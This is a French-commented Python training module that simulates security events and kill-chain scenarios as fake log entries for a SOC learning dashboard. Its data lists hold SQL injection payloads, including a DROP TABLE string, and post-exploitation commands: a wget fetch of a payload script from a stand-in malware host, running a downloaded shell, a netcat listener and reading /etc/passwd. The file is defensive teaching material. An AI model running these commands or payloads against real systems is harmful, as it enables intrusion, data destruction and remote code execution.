"""
========================================
simulator.py — Générateur d'événements de sécurité
========================================

📚 CONCEPT : POURQUOI UN SIMULATEUR ?
Dans un vrai SOC, les logs viennent de vrais serveurs attaqués.
Ici, on simule ces attaques pour apprendre SANS risque.
C'est exactement comme les exercices militaires : on s'entraîne
avec de "fausses" attaques pour être prêt face aux vraies.

📖 TYPES D'ATTAQUES SIMULÉES :
1. Brute Force SSH   → Essayer des milliers de mots de passe
2. Port Scan         → Scanner tous les ports d'une machine
3. SQL Injection     → Tenter d'attaquer une base de données
4. DDoS              → Bombarder un serveur de requêtes
5. Malware           → Détection de logiciel malveillant
6. Privilege Escalation → Tenter d'obtenir des droits admin
7. Data Exfiltration → Vol de données
8. Login normal      → Activité légitime (pas une attaque)
"""

import random          # Pour générer des données aléatoires
import time            # Pour gérer les délais entre les événements
import json            # Pour lire la configuration
import os              # Pour les chemins de fichiers
from datetime import datetime  # Pour les horodatages


def load_config():
    """Charge la configuration depuis config.json"""
    config_path = os.path.join(os.path.dirname(__file__), "config.json")
    with open(config_path, "r") as f:
        return json.load(f)


# ============================================================
# DONNÉES DE SIMULATION
# Ces listes contiennent des données réalistes pour nos logs
# ============================================================

# Plages d'IP simulées (réseaux fictifs)
INTERNAL_IPS = [
    f"192.168.1.{i}" for i in range(1, 30)    # Réseau interne de l'entreprise
]

EXTERNAL_IPS = [
    f"203.0.113.{i}" for i in range(1, 50)    # IPs externes (potentiels attaquants)
] + [
    f"198.51.100.{i}" for i in range(1, 30)
] + [
    f"185.220.{random.randint(100, 200)}.{random.randint(1, 254)}"
    for _ in range(20)
]

# Noms d'utilisateurs simulés
USERNAMES = [
    "admin", "root", "user", "administrator", "guest",
    "alice", "bob", "charlie", "service", "backup",
    "test", "deploy", "jenkins", "postgres", "mysql"
]

# Services et ports courants
SERVICES = {
    22: "SSH",
    23: "Telnet",
    80: "HTTP",
    443: "HTTPS",
    3389: "RDP",
    3306: "MySQL",
    5432: "PostgreSQL",
    6379: "Redis",
    8080: "HTTP-Alt",
    4444: "Metasploit"  # 📚 Port classique utilisé par les hackers !
}

# Payloads SQL Injection typiques
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM passwords --",
    "admin'--",
    "1' OR 1=1 --",
]

# User-agents suspects (outils de hacking connus)
SUSPICIOUS_AGENTS = [
    "sqlmap/1.7",           # 📚 Outil automatique de SQL injection
    "Nikto/2.1.6",          # 📚 Scanner de vulnérabilités web
    "masscan/1.0",          # 📚 Scanner de ports ultra-rapide
    "nmap scripting engine",# 📚 Nmap = le scanner de réseau le plus populaire
    "zgrab/0.x",
]

# Commandes suspectes post-exploitation
SUSPICIOUS_COMMANDS = [
    "cat /etc/passwd",      # Lecture des utilisateurs système
    "wget http://malware.xyz/payload.sh",  # Téléchargement d'un payload
    "chmod +x shell.sh && ./shell.sh",     # Exécution d'un shell
    "nc -lvp 4444",         # Netcat : ouverture d'un port d'écoute
    "id && whoami",         # Vérification des privilèges
    "find / -suid 2>/dev/null",  # Recherche de vulnérabilités SUID
    "sudo -l",              # Liste des commandes sudo disponibles
]


class AttackSimulator:
    """
    Le cœur du simulateur. Cette classe génère des événements
    de sécurité réalistes de façon aléatoire.
    """

    def __init__(self):
        """Initialise le simulateur avec la configuration."""
        config = load_config()
        self.sim_config = config["simulator"]
        self.thresholds = config["thresholds"]

        # Dictionnaire pour suivre les tentatives par IP
        # {"192.168.1.5": [timestamp1, timestamp2, ...]}
        self.failed_attempts = {}

        # Compteur global d'événements générés
        self.event_count = 0

        print("[SIMULATOR] 🚀 Simulateur d'attaques initialisé")

    def get_random_ip(self, internal: bool = False) -> str:
        """
        Retourne une adresse IP aléatoire.
        
        📚 QU'EST-CE QU'UNE ADRESSE IP ?
        C'est comme une adresse postale pour un ordinateur sur le réseau.
        192.168.x.x = réseau privé (interne à l'entreprise)
        203.x.x.x   = réseau public (Internet, potentiels attaquants)
        
        Paramètre internal : si True, retourne une IP interne
        """
        if internal:
            return random.choice(INTERNAL_IPS)
        return random.choice(EXTERNAL_IPS)

    def generate_timestamp(self) -> str:
        """Génère un horodatage au format standard des logs."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ============================================================
    # GÉNÉRATEURS D'ATTAQUES SPÉCIFIQUES
    # Chaque méthode retourne un dictionnaire représentant un événement
    # ============================================================

    def generate_ssh_brute_force(self) -> dict:
        """
        📚 ATTAQUE : BRUTE FORCE SSH
        ============================
        SSH (Secure Shell) est le protocole utilisé pour se connecter
        à distance à un serveur Linux. Les hackers tentent des milliers
        de combinaisons login/mot de passe pour y accéder.
        
        Indicateurs : beaucoup de "Failed password" en peu de temps
        depuis la même IP.
        """
        attacker_ip = self.get_random_ip(internal=False)
        username = random.choice(USERNAMES)
        self.event_count += 1

        # On simule plusieurs tentatives d'affilée (réalisme)
        attempts = random.randint(3, 15)

        # On enregistre les tentatives pour la détection
        if attacker_ip not in self.failed_attempts:
            self.failed_attempts[attacker_ip] = []
        self.failed_attempts[attacker_ip].append(time.time())

        raw_log = (
            f"{self.generate_timestamp()} sshd[{random.randint(1000,9999)}]: "
            f"Failed password for {username} from {attacker_ip} port "
            f"{random.randint(40000, 65000)} ssh2"
        )

        # On détermine le niveau selon le nombre de tentatives
        level = "CRITICAL" if attempts >= 8 else "WARNING"

        return {
            "timestamp": self.generate_timestamp(),
            "level": level,
            "event_type": "brute_force_ssh",
            "source_ip": attacker_ip,
            "target": f"SSH Port 22 (user: {username})",
            "message": f"🔴 BRUTE FORCE SSH: {attempts} tentatives depuis {attacker_ip} → utilisateur '{username}'",
            "raw_log": raw_log,
            "explained": (
                f"⚠️ ALERTE BRUTE FORCE SSH\n"
                f"L'IP {attacker_ip} a tenté {attempts} connexions SSH en quelques secondes.\n"
                f"Un humain normal ne fait pas autant de tentatives si vite.\n"
                f"C'est un programme automatique (bot) qui essaie des mots de passe.\n"
                f"🛡️ Contre-mesure : Bloquer l'IP, utiliser fail2ban, désactiver l'auth par mot de passe."
            )
        }

    def generate_port_scan(self) -> dict:
        """
        📚 ATTAQUE : PORT SCAN
        ======================
        Avant d'attaquer, un hacker "scanne" sa cible pour voir
        quels ports sont ouverts = quels services tournent.
        C'est comme tester toutes les portes d'un bâtiment.
        
        Outil classique : nmap ("Network Mapper")
        """
        attacker_ip = self.get_random_ip(internal=False)
        target_ip = self.get_random_ip(internal=True)

        # On simule un scan de plusieurs ports
        scanned_ports = random.sample(list(SERVICES.keys()), random.randint(3, 7))
        open_ports = random.sample(scanned_ports, random.randint(1, len(scanned_ports)))

        raw_log = (
            f"{self.generate_timestamp()} kernel: IPTABLES DROP IN=eth0 "
            f"SRC={attacker_ip} DST={target_ip} PROTO=TCP "
            f"DPT={random.choice(scanned_ports)} FLAGS=S"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "WARNING",
            "event_type": "port_scan",
            "source_ip": attacker_ip,
            "target": target_ip,
            "message": f"🟠 PORT SCAN: {attacker_ip} scanne {target_ip} | Ports ouverts: {open_ports}",
            "raw_log": raw_log,
            "explained": (
                f"⚠️ RECONNAISSANCE RÉSEAU DÉTECTÉE\n"
                f"{attacker_ip} effectue un scan de ports sur {target_ip}.\n"
                f"Ports scannés: {scanned_ports}\n"
                f"Cette phase de 'reconnaissance' précède généralement une attaque.\n"
                f"🛡️ Contre-mesure : IDS/IPS, firewall, honeypot."
            )
        }

    def generate_sql_injection(self) -> dict:
        """
        📚 ATTAQUE : SQL INJECTION
        ==========================
        Le hacker insère du code SQL malveillant dans un formulaire web.
        Exemple : au lieu d'un nom d'utilisateur, il entre :
            ' OR '1'='1
        Ce qui peut contourner l'authentification !
        
        C'est l'une des attaques les plus répandues sur le web.
        """
        attacker_ip = self.get_random_ip(internal=False)
        payload = random.choice(SQL_PAYLOADS)
        agent = random.choice(SUSPICIOUS_AGENTS + ["Mozilla/5.0 (sqlmap)"])
        endpoint = random.choice(["/login", "/search", "/user", "/admin", "/api/v1/auth"])

        raw_log = (
            f"{self.generate_timestamp()} apache2 access.log: "
            f"{attacker_ip} - - \"POST {endpoint}?id={payload} HTTP/1.1\" "
            f"200 1234 \"-\" \"{agent}\""
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "CRITICAL",
            "event_type": "sql_injection",
            "source_ip": attacker_ip,
            "target": f"Web App {endpoint}",
            "message": f"🔴 SQL INJECTION: {attacker_ip} → {endpoint} | Payload: {payload[:30]}",
            "raw_log": raw_log,
            "explained": (
                f"🚨 TENTATIVE D'INJECTION SQL DÉTECTÉE\n"
                f"L'IP {attacker_ip} tente d'injecter du code SQL dans {endpoint}.\n"
                f"Payload détecté: {payload}\n"
                f"Ce type d'attaque peut permettre de:\n"
                f"  • Contourner l'authentification\n"
                f"  • Lire/modifier/supprimer la base de données\n"
                f"🛡️ Contre-mesure : Utiliser des requêtes préparées, WAF, valider les entrées."
            )
        }

    def generate_ddos(self) -> dict:
        """
        📚 ATTAQUE : DDoS (Distributed Denial of Service)
        ==================================================
        Le hacker envoie des millions de requêtes pour saturer
        un serveur et le rendre inaccessible.
        Comme si des milliers de personnes appelaient en même
        temps votre numéro de téléphone : plus personne ne peut joindre.
        """
        # On simule plusieurs IPs attaquantes (botnet)
        num_bots = random.randint(50, 500)
        target_ip = self.get_random_ip(internal=True)
        requests_per_second = random.randint(5000, 50000)

        raw_log = (
            f"{self.generate_timestamp()} nginx: [alert] 1024 worker connections are open, "
            f"traffic spike detected from {num_bots} unique IPs, "
            f"{requests_per_second} req/s to {target_ip}"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "CRITICAL",
            "event_type": "ddos",
            "source_ip": f"BOTNET ({num_bots} IPs)",
            "target": target_ip,
            "message": f"🔴 DDoS ATTACK: {requests_per_second:,} req/s depuis {num_bots} IPs vers {target_ip}",
            "raw_log": raw_log,
            "explained": (
                f"🚨 ATTAQUE DDoS EN COURS\n"
                f"Flood de {requests_per_second:,} requêtes/seconde depuis un botnet de {num_bots} machines.\n"
                f"Cible: {target_ip}\n"
                f"Le serveur risque de devenir inaccessible (saturation).\n"
                f"🛡️ Contre-mesure : CDN (Cloudflare), rate limiting, scrubbing center."
            )
        }

    def generate_malware_detection(self) -> dict:
        """
        📚 ÉVÉNEMENT : DÉTECTION DE MALWARE
        =====================================
        L'antivirus/EDR détecte un fichier ou comportement malveillant.
        EDR = Endpoint Detection & Response (antivirus avancé).
        """
        infected_ip = self.get_random_ip(internal=True)
        malware_types = [
            "Trojan.GenericKD.45632",
            "Ransomware.WannaCry.B",
            "Backdoor.Mirai.C",
            "Rootkit.Linux.Azazel",
            "Worm.AutoRun.AAAK",
            "Spyware.KeyLogger.X",
        ]
        malware = random.choice(malware_types)
        process = random.choice(["explorer.exe", "svchost.exe", "notepad.exe", "update.exe"])

        raw_log = (
            f"{self.generate_timestamp()} antivirus: DETECTION {malware} in "
            f"process {process} (PID {random.randint(1000, 9999)}) "
            f"on host {infected_ip} - ACTION: QUARANTINED"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "CRITICAL",
            "event_type": "malware_detection",
            "source_ip": infected_ip,
            "target": f"Host {infected_ip}",
            "message": f"🔴 MALWARE: '{malware}' dans {process} sur {infected_ip}",
            "raw_log": raw_log,
            "explained": (
                f"🚨 LOGICIEL MALVEILLANT DÉTECTÉ\n"
                f"L'antivirus a identifié: {malware}\n"
                f"Processus infecté: {process} sur {infected_ip}\n"
                f"Le fichier a été mis en quarantaine.\n"
                f"🛡️ Actions : Isoler la machine, analyser le vecteur d'infection, restaurer si nécessaire."
            )
        }

    def generate_privilege_escalation(self) -> dict:
        """
        📚 ATTAQUE : ÉLÉVATION DE PRIVILÈGES
        =====================================
        Après avoir obtenu un accès limité, le hacker tente de devenir
        "root" (administrateur) pour avoir le contrôle total.
        C'est comme passer de visiteur à propriétaire du bâtiment.
        """
        attacker_ip = self.get_random_ip(internal=True)
        username = random.choice(["www-data", "apache", "nginx", "postgres", "nobody"])
        command = random.choice(SUSPICIOUS_COMMANDS)

        raw_log = (
            f"{self.generate_timestamp()} sudo: {username} : FAILED ; "
            f"TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND={command}"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "CRITICAL",
            "event_type": "privilege_escalation",
            "source_ip": attacker_ip,
            "target": f"Host {attacker_ip} (user: {username})",
            "message": f"🔴 PRIVESC: '{username}' tente d'escalader vers root | CMD: {command[:40]}",
            "raw_log": raw_log,
            "explained": (
                f"🚨 TENTATIVE D'ÉLÉVATION DE PRIVILÈGES\n"
                f"L'utilisateur '{username}' (compte de service, normalement limité) "
                f"tente d'exécuter des commandes root.\n"
                f"Commande suspecte: {command}\n"
                f"Cela indique qu'un service a peut-être été compromis.\n"
                f"🛡️ Contre-mesure : Principe du moindre privilège, sudo restrictions, audit des logs."
            )
        }

    def generate_data_exfiltration(self) -> dict:
        """
        📚 ATTAQUE : EXFILTRATION DE DONNÉES
        =====================================
        Le hacker extrait des données sensibles vers l'extérieur.
        Détectable par : gros transferts vers des IPs inconnues,
        à des heures inhabituelles, sur des ports non-standards.
        """
        internal_ip = self.get_random_ip(internal=True)
        external_ip = self.get_random_ip(internal=False)
        data_size_mb = random.randint(100, 5000)
        port = random.choice([443, 80, 4444, 8443, 53])  # Parfois via DNS (port 53) !

        raw_log = (
            f"{self.generate_timestamp()} firewall: ALLOWED OUT {internal_ip}:{random.randint(40000,65000)} "
            f"→ {external_ip}:{port} BYTES={data_size_mb * 1024 * 1024} PROTO=TCP"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "CRITICAL",
            "event_type": "data_exfiltration",
            "source_ip": internal_ip,
            "target": f"External {external_ip}:{port}",
            "message": f"🔴 EXFILTRATION: {data_size_mb} MB de {internal_ip} → {external_ip}:{port}",
            "raw_log": raw_log,
            "explained": (
                f"🚨 POSSIBLE EXFILTRATION DE DONNÉES\n"
                f"Transfert inhabituel: {data_size_mb} MB depuis {internal_ip} vers {external_ip}.\n"
                f"Port utilisé: {port} {'(DNS tunneling possible !)' if port == 53 else ''}\n"
                f"Ce volume de données sortant vers une IP inconnue est suspect.\n"
                f"🛡️ Contre-mesure : DLP (Data Loss Prevention), surveillance des flux réseau, UEBA."
            )
        }

    def generate_normal_login(self) -> dict:
        """
        📚 ÉVÉNEMENT NORMAL : Connexion légitime
        Un SOC ne voit pas QUE des attaques.
        La majorité des événements sont normaux (bruit de fond).
        C'est important de les inclure pour apprendre à distinguer.
        """
        user_ip = self.get_random_ip(internal=True)
        username = random.choice(["alice", "bob", "charlie", "diana", "eve"])
        service = random.choice(["SSH", "VPN", "Web Portal", "Email"])

        raw_log = (
            f"{self.generate_timestamp()} {service.lower()}: "
            f"Accepted password for {username} from {user_ip} port "
            f"{random.randint(40000, 65000)}"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "INFO",
            "event_type": "successful_login",
            "source_ip": user_ip,
            "target": service,
            "message": f"✅ LOGIN OK: {username} connecté via {service} depuis {user_ip}",
            "raw_log": raw_log,
            "explained": "Connexion normale d'un utilisateur authentifié."
        }

    def generate_failed_login(self) -> dict:
        """
        📚 ÉVÉNEMENT : Échec de connexion simple
        Un seul échec = normal (mauvais mot de passe).
        Plusieurs échecs depuis la même IP = suspect !
        """
        user_ip = self.get_random_ip(internal=False)
        username = random.choice(USERNAMES)

        raw_log = (
            f"{self.generate_timestamp()} sshd: "
            f"Failed password for invalid user {username} from {user_ip}"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "WARNING",
            "event_type": "failed_login",
            "source_ip": user_ip,
            "target": f"SSH (user: {username})",
            "message": f"⚠️ LOGIN FAILED: {username} depuis {user_ip}",
            "raw_log": raw_log,
            "explained": (
                f"Échec de connexion pour '{username}' depuis {user_ip}.\n"
                f"Un seul échec peut être une erreur. Surveiller si ça se répète."
            )
        }

    def generate_firewall_block(self) -> dict:
        """
        📚 ÉVÉNEMENT : Blocage par le pare-feu
        Le firewall bloque automatiquement des connexions suspectes.
        """
        blocked_ip = self.get_random_ip(internal=False)
        target_port = random.choice(list(SERVICES.keys()))

        raw_log = (
            f"{self.generate_timestamp()} iptables: BLOCK IN=eth0 "
            f"SRC={blocked_ip} DST={self.get_random_ip(internal=True)} "
            f"PROTO=TCP DPT={target_port}"
        )

        self.event_count += 1

        return {
            "timestamp": self.generate_timestamp(),
            "level": "INFO",
            "event_type": "firewall_block",
            "source_ip": blocked_ip,
            "target": f"Port {target_port} ({SERVICES.get(target_port, 'unknown')})",
            "message": f"🛡️ FIREWALL BLOCK: {blocked_ip} → Port {target_port}/{SERVICES.get(target_port, '?')}",
            "raw_log": raw_log,
            "explained": f"Le pare-feu a bloqué une tentative de connexion sur le port {target_port}."
        }

    def generate_event(self) -> dict:
        """
        Génère un événement aléatoire en mélangeant attaques et trafic normal.
        
        📚 COMMENT ÇA MARCHE ?
        On utilise random.choices() avec des 'weights' (poids/probabilités).
        Plus le poids est élevé, plus l'événement est probable.
        
        Ici on simule un réseau SOUS ATTAQUE donc beaucoup d'événements suspects.
        """
        # Liste des générateurs disponibles
        generators = [
            self.generate_ssh_brute_force,      # Brute force SSH
            self.generate_port_scan,             # Scan de ports
            self.generate_sql_injection,         # Injection SQL
            self.generate_ddos,                  # DDoS
            self.generate_malware_detection,     # Malware
            self.generate_privilege_escalation,  # Élévation de privilèges
            self.generate_data_exfiltration,     # Exfiltration
            self.generate_normal_login,          # Login normal (bruit de fond)
            self.generate_failed_login,          # Échec de login
            self.generate_firewall_block,        # Blocage firewall
        ]

        # Poids : les logins normaux sont plus fréquents que les attaques graves
        weights = [
            15,  # brute force (assez fréquent)
            12,  # port scan
            10,  # sql injection
            5,   # ddos (rare mais grave)
            8,   # malware
            6,   # privilege escalation
            5,   # exfiltration (rare)
            25,  # login normal (très fréquent = bruit de fond)
            10,  # failed login (fréquent)
            4,   # firewall block
        ]

        # random.choices retourne une liste, on prend le premier élément [0]
        chosen_generator = random.choices(generators, weights=weights, k=1)[0]
        return chosen_generator()

    def generate_attack_scenario(self, scenario_type: str) -> list:
        """
        Génère un scénario d'attaque complet en plusieurs étapes.
        
        📚 UN SCÉNARIO = UNE ATTAQUE RÉALISTE
        Les vraies attaques suivent des phases :
        Reconnaissance → Exploitation → Post-exploitation → Exfiltration
        C'est le "kill chain" cybersécurité !
        
        Paramètre scenario_type : "apt", "ransomware", ou "insider"
        Retourne : une liste d'événements constituant le scénario
        """
        events = []
        attacker_ip = self.get_random_ip(internal=False)

        if scenario_type == "apt":
            # APT = Advanced Persistent Threat (attaque ciblée, longue durée)
            events = [
                # Phase 1 : Reconnaissance
                self.generate_port_scan(),
                # Phase 2 : Tentatives d'intrusion
                self.generate_ssh_brute_force(),
                self.generate_ssh_brute_force(),
                # Phase 3 : Injection (si accès web)
                self.generate_sql_injection(),
                # Phase 4 : Installation d'un backdoor (malware)
                self.generate_malware_detection(),
                # Phase 5 : Élévation de privilèges
                self.generate_privilege_escalation(),
                # Phase 6 : Vol de données
                self.generate_data_exfiltration(),
            ]

        elif scenario_type == "ransomware":
            # Ransomware : chiffre les données et demande une rançon
            events = [
                self.generate_failed_login(),
                self.generate_ssh_brute_force(),
                self.generate_malware_detection(),
                self.generate_privilege_escalation(),
                # Simulation de chiffrement massif (exfiltration avant chiffrement)
                self.generate_data_exfiltration(),
            ]
            # On modifie le dernier événement pour simuler le ransomware
            events[-1]["message"] = "🔴 RANSOMWARE: Chiffrement massif des fichiers en cours !"
            events[-1]["event_type"] = "ransomware"

        elif scenario_type == "insider":
            # Insider threat : un employé malveillant en interne
            insider_ip = self.get_random_ip(internal=True)  # IP interne !
            events = [
                self.generate_normal_login(),  # Il est connecté légitimement
                self.generate_privilege_escalation(),  # Il tente d'avoir plus d'accès
                self.generate_data_exfiltration(),  # Il vole des données
            ]
            # On met les IPs en interne pour simuler la menace interne
            for e in events:
                e["source_ip"] = insider_ip

        return events
